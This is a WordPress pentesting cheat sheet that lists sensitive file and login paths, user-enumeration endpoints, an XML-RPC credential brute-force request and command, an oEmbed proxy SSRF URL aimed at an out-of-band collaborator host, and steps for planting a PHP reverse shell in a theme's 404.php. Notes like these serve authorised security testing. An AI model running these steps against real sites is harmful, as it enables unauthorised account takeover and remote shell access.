

# download
https://wordpress.org/download/

## Vulnerability
https://patchstack.com/database/
https://wpscan.com/wordpress/60/


## hacks
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
- https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/wordpress/


## Basic Information
/wp-content/uploads/2018/08/a.txt
/wp-content/themes/twentytwelve/404.php
/wp-content/themes/default/404.php

## Main WordPress Files
/index.php
/license.txt
/readme.html
/wp-activate.php
/wp-sitemap.xml
/robots.txt
/sitemap.xml
/feed
/wp-includes/functions.php
/xmlrpc.php

## Login folders (may be renamed to hide it):
/wp-admin/login.php
/wp-admin/wp-login.php
/login.php
/wp-login.php
/wp-login/
/wp-admin/
/wp-admin.php
/login/

## Configuration files
/.htaccess
/wp-config.php              #information required by WordPress to connect to the database.
/_wpeprivate/config.json

## xmlrpc.php
POST /xmlrpc.php --data <methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1


## main directory where plugins and themes are stored.
/wp-content/
/wp-content/uploads/
/wp-includes/
/uploads
/upload

## information required by WordPress to connect to the database.
/wp-config.php

## Users Permissions
- Administrator
- Editor: Publish and manages his and others posts
- Author: Publish and manage his own posts
- Contributor: Write and manage his posts but cannot publish them
- Subscriber: Browser posts and edit their profile

## Get WordPress version
curl https://victim.com/ | grep 'content="WordPress'
<meta name="generator"
CSS link files
JavaScript files

## User enumeration
/?author=XXX
/wp-json/wp/v2/users
/wp-json/oembed/1.0/embed?url=POST-URL
/wp-json/wp/v2/pages
/wp-json/?rest_route=/wp/v2/users

## Credentials Bruteforce
POST /xmlrpc.php
<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>pass</value></param></params></methodCall>

## /wp-json/oembed/1.0/proxy - SSRF
https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net 


## Auto scan
 - [wpscan]
    - scan
    - brut-force
    - php-reverse-shell to 404.php
    - run 404.php on browser ann get shell